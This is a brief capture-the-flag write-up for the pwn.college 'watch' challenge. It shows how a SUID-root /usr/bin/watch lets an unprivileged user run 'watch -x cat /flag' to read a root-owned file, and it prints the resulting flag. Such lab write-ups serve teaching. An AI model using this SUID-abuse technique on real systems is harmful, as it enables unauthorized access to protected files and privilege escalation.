---
layout: page
title: "Challenge Name: watch"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Begineer
**Date**: 2025-07-15  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/watch`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/watch
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/watch
```

-The `s` in `-rws` indicates it's a SUID binary.
-`watch` runs with **root privileges**.

## 🚀 Exploitation

The `watch` command in Linux is used to run a command repeatedly at fixed intervals and display its output in real time in your terminal.

- watch uses sh -t to run any command but -x allows user to run command directly as watch , as our watch is suid set we must use -x option

```bash
watch -x cat /flag
```

Output:
```
Every 2.0s: cat /flag                                                                                                                                                    program-misuse~watch: Wed Jul 16 12:36:37 2025

pwn.college{shTAmRuVovewiqzWLUz2C-Sck8C.dNzNxwSM0IzMyEzW}

```

      
